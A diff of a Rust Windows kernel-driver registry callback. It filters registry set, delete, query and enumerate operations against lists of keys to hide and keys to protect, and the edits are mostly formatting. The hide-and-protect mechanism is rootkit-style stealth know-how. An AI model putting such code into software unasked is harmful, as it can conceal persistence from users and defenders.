@@ -1,27 +1,27 @@
 #![allow(non_upper_case_globals)]
 
-use alloc::{format, string::String};
-use core::{ffi::c_void, ptr::null_mut};
-use wdk::println;
-use wdk_sys::ntddk::*;
-use wdk_sys::_REG_NOTIFY_CLASS::*;
-use wdk_sys::{_MODE::KernelMode, *};
-use alloc::collections::BTreeMap;
 use crate::alloc::string::ToString;
-use core::sync::atomic::{AtomicU64, Ordering};
-use spin::Mutex;
-use core::ptr::addr_of_mut;
 use crate::{
     registry::{
-        utils::{check_key, enumerate_key},
         Registry,
+        utils::{check_key, enumerate_key},
     },
     utils::{pool::PoolMemory, valid_kernel_memory},
 };
+use alloc::collections::BTreeMap;
+use alloc::{format, string::String};
+use core::ptr::addr_of_mut;
+use core::sync::atomic::{AtomicU64, Ordering};
+use core::{ffi::c_void, ptr::null_mut};
+use spin::Mutex;
+use wdk::println;
+use wdk_sys::_REG_NOTIFY_CLASS::*;
+use wdk_sys::ntddk::*;
+use wdk_sys::{_MODE::KernelMode, *};
 
 use super::{
-    utils::{check_key_value, enumerate_value_key, RegistryInfo},
-    HIDE_KEYS, HIDE_KEY_VALUES, PROTECTION_KEYS, PROTECTION_KEY_VALUES,
+    HIDE_KEY_VALUES, HIDE_KEYS, PROTECTION_KEY_VALUES, PROTECTION_KEYS,
+    utils::{RegistryInfo, check_key_value, enumerate_value_key},
 };
 
 /// Handle for Registry Callback.
@@ -84,38 +84,21 @@ pub unsafe extern "C" fn registry_callback(
     argument1: *mut c_void,
     argument2: *mut c_void,
 ) -> NTSTATUS {
-
-    
     let reg_notify_class = argument1 as i32;
     let status = match reg_notify_class {
-        RegNtPreSetValueKey => {
-            
-            pre_set_value_key(argument2 as *mut REG_SET_VALUE_KEY_INFORMATION)
-        }
+        RegNtPreSetValueKey => pre_set_value_key(argument2 as *mut REG_SET_VALUE_KEY_INFORMATION),
         RegNtPreDeleteValueKey => {
-            
             pre_delete_value_key(argument2 as *mut REG_DELETE_VALUE_KEY_INFORMATION)
         }
-        RegNtPreDeleteKey => {
-            
-            pre_delete_key(argument2 as *mut REG_DELETE_KEY_INFORMATION)
-        }
-        RegNtPreQueryKey => {
-           
-            pre_query_key(argument2 as *mut REG_QUERY_KEY_INFORMATION)
-        }
+        RegNtPreDeleteKey => pre_delete_key(argument2 as *mut REG_DELETE_KEY_INFORMATION),
+        RegNtPreQueryKey => pre_query_key(argument2 as *mut REG_QUERY_KEY_INFORMATION),
         RegNtPostEnumerateKey => {
-            
             post_enumerate_key(argument2 as *mut REG_POST_OPERATION_INFORMATION)
         }
         RegNtPostEnumerateValueKey => {
-            
             post_enumerate_key_value(argument2 as *mut REG_POST_OPERATION_INFORMATION)
         }
-        _ => {
-            
-            STATUS_SUCCESS
-        }
+        _ => STATUS_SUCCESS,
     };
 
     status
@@ -329,8 +312,6 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
     STATUS_SUCCESS
 }
 
-
-
 /// Handles the pre-query key operation.
 ///
 /// # Arguments
@@ -342,7 +323,6 @@ unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTA
 /// * A status code indicating success or failure.
 unsafe fn pre_query_key(info: *mut REG_QUERY_KEY_INFORMATION) -> NTSTATUS {
     if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
-        
         return STATUS_SUCCESS;
     }
 
@@ -393,14 +373,15 @@ unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> N
         return STATUS_SUCCESS;
     }
 
-    let buffer = core::slice::from_raw_parts(
-        (*value_name).Buffer,
-        ((*value_name).Length / 2) as usize,
-    );
+    let buffer =
+        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
     let name = String::from_utf16_lossy(buffer);
-    
 
-    if Registry::<(String, String)>::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
+    if Registry::<(String, String)>::check_target(
+        key.clone(),
+        name.clone(),
+        PROTECTION_KEY_VALUES.lock(),
+    ) {
         log::warn!(
             "pre_delete_value_key: Access denied for key '{}' value '{}'",
             key,
@@ -444,12 +425,9 @@ unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATU
         return STATUS_SUCCESS;
     }
 
-    let buffer = core::slice::from_raw_parts(
-        (*value_name).Buffer,
-        ((*value_name).Length / 2) as usize,
-    );
+    let buffer =
+        core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
     let name = String::from_utf16_lossy(buffer);
-    
 
     if Registry::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
         log::warn!(
@@ -475,7 +453,7 @@ unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATU
 /// * `Err(NTSTATUS)` - error status.
 pub unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS> {
     let object_ptr = (*info).get_object();
-    
+
     let mut reg_path = core::ptr::null::<UNICODE_STRING>();
     let status = CmCallbackGetKeyObjectIDEx(
         addr_of_mut!(CALLBACK_REGISTRY),
@@ -484,7 +462,7 @@ pub unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS
         &mut reg_path,
         0,
     );
-    
+
     if !NT_SUCCESS(status) {
         log::error!(
             "read_key: CmCallbackGetKeyObjectIDEx failed with status: {} for object pointer: {:?}",
@@ -493,33 +471,36 @@ pub unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS
         );
         return Err(status);
     }
-    
+
     if reg_path.is_null() {
-        log::error!("read_key: reg_path is null for object pointer: {:?}", object_ptr);
+        log::error!(
+            "read_key: reg_path is null for object pointer: {:?}",
+            object_ptr
+        );
         return Err(STATUS_UNSUCCESSFUL);
     }
-    
+
     let buffer = (*reg_path).Buffer;
     let length = (*reg_path).Length;
-    
+
     if buffer.is_null() || length == 0 {
         log::error!(
             "read_key: Invalid reg_path returned. reg_path: {:?}, Buffer: {:?}, Length: {}",
-            reg_path, buffer, length
+            reg_path,
+            buffer,
+            length
         );
         CmCallbackReleaseKeyObjectIDEx(reg_path);
         return Err(STATUS_UNSUCCESSFUL);
     }
-    
+
     // Note: the Length field is in bytes; we divide by 2 for wide characters.
     let key_slice = core::slice::from_raw_parts(buffer, (length / 2) as usize);
     let key_name = String::from_utf16_lossy(key_slice);
-    
+
     // Instead of logging each duplicate message, update the cache.
     update_and_maybe_flush(&key_name, reg_path);
-    
+
     CmCallbackReleaseKeyObjectIDEx(reg_path);
     Ok(key_name)
 }
-
-
